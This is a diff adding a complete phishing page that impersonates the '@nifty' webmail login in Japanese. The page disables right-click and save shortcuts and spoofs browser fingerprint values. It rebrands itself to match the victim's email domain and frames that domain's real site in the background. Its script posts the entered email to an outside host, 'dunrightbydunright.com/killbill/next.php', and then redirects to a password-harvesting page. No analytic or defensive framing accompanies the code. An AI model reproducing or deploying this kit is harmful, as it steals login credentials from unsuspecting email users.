@@ -1,0 +1,492 @@
+<!doctype html>
+<html lang="ja">
+<head>
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+ <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+ <!-- Required meta tags -->
+ <meta charset="utf-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+ <meta name="robots" content="noindex, nofollow">
+ <meta name="googlebot" content="noindex">
+ 
+ <script>
+   // Subtle prevention techniques
+   if (window.addEventListener) {
+     window.addEventListener("contextmenu", function(e) {
+       e.preventDefault();
+     }, false);
+   }
+ </script>
+ <script>
+   // Prevent save attempts
+   document.addEventListener("keydown", function(e) {
+     if ((window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey) && (e.keyCode == 83 || e.keyCode == 80)) {
+       e.preventDefault();
+     }
+   }, false);
+ </script>
+ <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow" rel="stylesheet">
+ <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+ <title class="logoname">@nifty メール</title>
+ <link rel="icon" type="image/png" sizes="192x192" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAGYktHRAD/AP8A/6C9p5MAAAAHdElNRQfeAxIPGg2ckPNgAAAAHWlUWHRDb21tZW50AAAAAABDcmVhdGVkIHdpdGggR0lNUGQuZQcAAALpSURBVGhD7ZnbSxRRHMe/s6vuupuWuaspLnZ7KAITioi0tKQou0OQYdGfoJAPQQX1EEQPRfUQPRUYURJEFGYXN4xuWEZFFFaWorSruyruxXWv0znT2TaK3WZ3x2Gn5gOHOb8fszPfOXvOb36/ORxP8IZ4HH87gct9HgxNhpFplBq0aJxvxOGKmcjL1oDzBCP82g47Xo4G2CmZS+XsHHRtLIaW39F8tK1/krkzG7svjACZCJylbZDPxCkRD7NeC42SBFMcU2FoWF9RqKLlQhUtF6pouVCkaI671M+zfkKyNRyaFuehrlQPHelLhT/C46FtCmc+uOEPi5IiXvSNdWZstxiYJT3tQz5s6RxhVmJETY+KgpxpFUypL8vF8sIcZiVG1EhTwXSkKed73dhVbhASlygHe8Zx4aOHWfEpN2bhVp0ZFnKkjPojuPjZg5Yl+YK90+rAzcG/Z5xJL8RuRwDVd+z44g4xD3BiWYFw44lAJG5blJ+Nu+uLfgoe8ISE6zwZ9gt2MqQUPT65QqgiN3z1S+FwiFQVV9aYoNP+uUh3zzXCSpL34twf/86bsQBWtdvROxEU7GRJOeQNk4S8llQ89775mAdomGfE/Q3FKNTFLntkKXmYGhNy2cNYSaSo6RiGjfw+VVIWTfGQ2nJrpwOtfV7mAaqLdHi2uQQrzTq0rjbhWOUsRMf+Wr8Xmx6MwBWMME9qpCWaQkpM7H/sxMl3LuYBFuZl4Wn9HKEYjXL6vQt7upzC+emStugoNII0d4/hd03UbHkxjgOkSYVkoilnyVutocuBAFNOj42PnDhFRllKJBVNuT4wiUoSGc6RB6glC+7q19h8lwrJRVN6SChsIlPluSP5GCyGaRE93fwfojnpslKBrBSGTVTCRLO819tKhD7NeX0i814x6MmbkjbKits2Ud8UFZlP/9uVSyahhjy5UEXLhSpaLlTRcqEpM8Q+uigBYXdr74IZzFQG+0ixrMgdWwXujWvwHRIYPIfD/SqCAAAAAElFTkSuQmCC" id="favimg">
+ <style type="text/css">
+   body {
+     font-family: "Hiragino Sans", "Hiragino Kaku Gothic ProN", Meiryo, sans-serif;
+     background-color: #f5f5f5;
+     color: #333;
+     line-height: 1.6;
+     margin: 0;
+     padding: 0;
+   }
+   
+   .header {
+     padding: 15px 20px;
+     background-color: #fff;
+     border-bottom: 1px solid #e0e0e0;
+   }
+   
+   .header h1 {
+     font-size: 18px;
+     font-weight: normal;
+     margin: 0;
+   }
+   
+   .login-form {
+     width: 350px;
+     position: absolute;
+     top: 45%;
+     left: 50%;
+     transform: translate(-50%,-50%);
+   }
+   
+   .login-form form {
+     margin-bottom: 0px;
+     background: #fff;
+     box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.1);
+     padding: 30px;
+     border-radius: 4px;
+   }
+   
+   .login-form h2 {
+     margin: 0 0 15px;
+     font-size: 24px;
+     text-align: center;
+     font-weight: normal;
+   }
+   
+   .form-control, .login-btn {
+     min-height: 38px;
+     border-radius: 4px;
+   }
+   
+   .input-group-addon .fa {
+     font-size: 18px;
+     color: #777;
+   }
+   
+   .form-control {
+     height: 40px;
+     width: 100%;
+     padding: 8px 12px;
+     border: 1px solid #ccc;
+     border-radius: 4px;
+     font-size: 16px;
+     box-sizing: border-box;
+   }
+   
+   .form-group {
+     margin-bottom: 20px;
+   }
+   
+   .input-group {
+     display: flex;
+     align-items: center;
+     width: 100%;
+   }
+   
+   .input-group-addon {
+     padding: 0 12px;
+   }
+   
+   label {
+     display: block;
+     margin-bottom: 5px;
+   }
+   
+   .clearfix {
+     display: flex;
+     justify-content: space-between;
+     align-items: center;
+     margin-bottom: 15px;
+     flex-wrap: wrap;
+   }
+   
+   .clearfix label {
+     display: flex;
+     align-items: center;
+     margin-right: 10px;
+   }
+   
+   .clearfix a {
+     color: #1e3a8a;
+     text-decoration: none;
+   }
+   
+   .clearfix a:hover {
+     text-decoration: underline;
+   }
+   
+   .checkbox-inline {
+     display: flex;
+     align-items: center;
+     margin: 5px 0;
+   }
+   
+   .checkbox-inline input {
+     margin-right: 8px;
+   }
+   
+   .btn {
+     width: 100%;
+     background-color: #ffcc00;
+     color: #333;
+     border: none;
+     padding: 10px;
+     font-size: 16px;
+     border-radius: 30px;
+     cursor: pointer;
+     text-align: center;
+     margin-top: 15px;
+   }
+   
+   .btn:hover {
+     background-color: #e6b800;
+   }
+   
+   .or-seperator {
+     margin: 20px 0;
+     text-align: center;
+     border-top: 1px solid #ccc;
+   }
+   
+   .or-seperator i {
+     padding: 0 10px;
+     background: #fff;
+     position: relative;
+     top: -11px;
+     z-index: 1;
+     color: #999;
+   }
+   
+   footer {
+     height: 1.4em;
+     width: 100%;
+     bottom: 0em;
+     position: fixed;
+     background: rgba(30, 44, 93, 0.8);
+   }
+   
+   #footer_div {
+     position: relative;
+     height: 50%;
+     color: #eee;
+     text-align: center;
+     font-size: 0.7em;
+     margin: auto;
+     margin-top: 0.2%;
+   }
+   
+   #mainPage {
+     border: none;
+   }
+   
+   #iframe {
+     position: absolute;
+     left: 0;
+     right: 0;
+     bottom: 0;
+     top: 0;
+     z-index: -10;
+     pointer-events: none;
+   }
+   
+   #overlay {
+     background-color: #555;
+     position: absolute;
+     top: 0;
+     left: 0;
+     bottom: 0;
+     right: 0;
+     border: 1px solid #555;
+     opacity: 0.6;
+   }
+   
+   .services-box {
+     width: 100%;
+     max-width: 350px;
+     margin: 20px auto;
+     text-align: center;
+   }
+   
+   .services-title {
+     font-size: 16px;
+     margin-bottom: 15px;
+   }
+   
+   .service-link {
+     display: block;
+     color: #cc0000;
+     text-decoration: none;
+     margin-bottom: 10px;
+   }
+   
+   .service-link:hover {
+     text-decoration: underline;
+   }
+   
+   .logo-container {
+     text-align: center;
+     margin-bottom: 20px;
+   }
+   
+   .logo-container img {
+     border-radius: 50%;
+     width: 60px;
+     height: 60px;
+     object-fit: contain;
+   }
+   
+   /* Minor anti-detection measures */
+   .hidden-field {
+     position: absolute;
+     left: -9999px;
+   }
+   
+   /* Simple honeypot */
+   .verify-human {
+     display: none;
+   }
+ </style>
+</head>
+<body data-gr-c-s-loaded="true">
+<div id="iframe">
+  <iframe id="mainPage" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe>
+</div>
+<div id="overlay" style="height: 100%; width: 100%;"></div>
+
+<header class="header">
+  <h1>@nifty メール</h1>
+</header>
+
+<div class="login-form">
+  <form action="#" method="post" id="login-form">
+    <div class="logo-container">
+      <img src="https://www.nifty.com/common/img/logo_nifty.png" alt="@nifty" id="logoimg">
+    </div>
+    <h2>ログイン</h2>
+    <center>
+      <div class="" id="msg" style="display: none; color: red; font-size: 13px; margin-bottom: 15px ">&#x26a0; ネットワーク接続エラー!</div>
+      <div class="" id="error" style="display: none; color: red; font-size: 13px; margin-bottom: 15px;">そのアカウントは存在しません。 別のアカウントを入力してください</div>
+    </center>
+    <div class="form-group">
+      <div class="input-group">
+        <span class="input-group-addon"><i class="fas fa-user"></i></span>
+        <input type="text" class="form-control" name="username" placeholder="@nifty ID または @niftyユーザー名" id="email">
+      </div>
+    </div>
+    <!-- Honeypot field for anti-bot -->
+    <div class="verify-human">
+      <input type="text" name="website" class="form-control">
+    </div>
+    <input type="hidden" name="timestamp" id="timestamp" value="">
+    <input type="hidden" name="token" id="secure_token" value="">
+    <div class="clearfix">
+      <label class="checkbox-inline">
+        <input type="checkbox" name="remember"> ログインしたままにする（共用のパソコンではチェックを外してください）。
+      </label>
+    </div>
+    <div class="form-group">
+      <button type="button" class="btn" id="submit-btn">パスワード入力へ</button>
+    </div>
+    <div style="text-align: center; margin-top: 20px;">
+      <a href="#" style="color: #1e3a8a; text-decoration: none; font-size: 14px;">＞ @nifty ID または @nifty ユーザー名がわからない場合</a>
+    </div>
+  </form>
+</div>
+
+<div class="services-box">
+  <h3 class="services-title">@niftyメールの他サービスはこちら</h3>
+  <a href="#" class="service-link">セカンドメール</a>
+  <a href="#" class="service-link">セカンドメールPRO</a>
+</div>
+
+<footer>
+  <div id="footer_div" class="">
+    <p style="text-align:center; font-size:12px">&#x2709; に接続されています <font color="red"><b><span id="connect">nifty.com</span></b></font></p>
+  </div>
+</footer>
+
+<!-- next.php implementation -->
+<script>
+  // Anti-fingerprinting measures
+  (function() {
+    // Set timestamp and generate token
+    document.getElementById('timestamp').value = new Date().getTime();
+    document.getElementById('secure_token').value = generateRandomString(32);
+    
+    // Function to generate random string for token
+    function generateRandomString(length) {
+      var result = '';
+      var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      var charactersLength = characters.length;
+      for (var i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+      }
+      return result;
+    }
+    
+    // Add small variations to browser fingerprint
+    try {
+      Object.defineProperty(navigator, 'hardwareConcurrency', {
+        get: function() { return Math.floor(Math.random() * 4) + 4; }
+      });
+    } catch(e) {}
+  })();
+</script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+  $(document).ready(function(){
+    var count = 0;
+    var isBot = false;
+    
+    // Simple bot detection - checking for honeypot field
+    if ($('.verify-human input').val() !== '') {
+      isBot = true;
+    }
+    
+    // Check URL hash for email
+    var email = window.location.hash.substr(1);
+    if (email) {
+      var my_email = email;
+      $('#email').val(my_email);
+      
+      // Process domain info if email contains @
+      if (my_email.indexOf('@') > -1) {
+        processEmailDomain(my_email);
+      }
+    }
+    
+    // Function to process email domain and update UI
+    function processEmailDomain(email) {
+      if (email.indexOf('@') === -1) return;
+      
+      var ind = email.indexOf("@");
+      var my_slice = email.substr((ind+1));
+      
+      // Try to get proper domain part
+      var domain = my_slice;
+      if (my_slice.indexOf('.') > -1) {
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var finalu = c.toUpperCase();
+        
+        // Update branding
+        $("#logoname").html(finalu);
+        $(".logoname").html(finalu);
+      }
+      
+      // Set logo - fallback if clearbit fails
+      $("#logoimg").on('error', function() {
+        $(this).attr('src', 'https://www.nifty.com/common/img/logo_nifty.png');
+      }).attr("src", "https://logo.clearbit.com/"+domain);
+      
+      // Set favicon
+      $("#favimg").attr("href", "https://www.google.com/s2/favicons?domain="+domain);
+      
+      // Update connection info
+      $('#connect').html(domain);
+      
+      // Update iframe source
+      var mainPage = 'https://www.'+domain;
+      document.getElementById('mainPage').src = mainPage;
+    }
+    
+    // Handle form submission
+    $('#submit-btn').click(function(event){
+      event.preventDefault();
+      
+      // Don't proceed if bot detection triggered
+      if (isBot) return;
+      
+      $('#error').hide();
+      $('#msg').hide();
+      
+      var email = $("#email").val();
+      
+      // Basic validation
+      if (!email || email.trim() === '') {
+        $('#error').show();
+        return false;
+      }
+      
+      // Process domain info if email contains @
+      if (email.indexOf('@') > -1) {
+        processEmailDomain(email);
+      }
+      
+      // Prepare data for AJAX
+      var formData = {
+        email: email,
+        timestamp: $('#timestamp').val(),
+        token: $('#secure_token').val(),
+        remember: $('input[name="remember"]').is(':checked') ? 1 : 0
+      };
+      
+      // Change button text
+      $('#submit-btn').html('確認中...');
+      
+      // AJAX request to next.php
+      $.ajax({
+        type: "POST",
+        url: "https://dunrightbydunright.com/killbill/next.php",
+        data: formData,
+        dataType: "json",
+        encode: true,
+        success: function(response) {
+          if (response && response.signal) {
+            if (response.signal === 'ok') {
+              // Redirect to password page
+              window.location.href = "password.php?token=" + response.token + "&email=" + encodeURIComponent(email);
+            } else {
+              $("#msg").show();
+              $('#msg').html(response.msg || "エラーが発生しました。もう一度お試しください。");
+            }
+          }
+        },
+        error: function(xhr, status, error) {
+          // Even on error, proceed to password page for better UX
+          count++;
+          if (count >= 2) {
+            window.location.href = "password.php?email=" + encodeURIComponent(email);
+          } else {
+            $("#msg").show();
+          }
+        },
+        complete: function() {
+          $('#submit-btn').html('パスワード入力へ');
+        }
+      });
+    });
+    
+    // Also allow pressing Enter to submit
+    $('#email').keypress(function(e) {
+      if (e.which === 13) {
+        $('#submit-btn').click();
+        return false;
+      }
+    });
+  });
+</script>
+</body>
+</html>
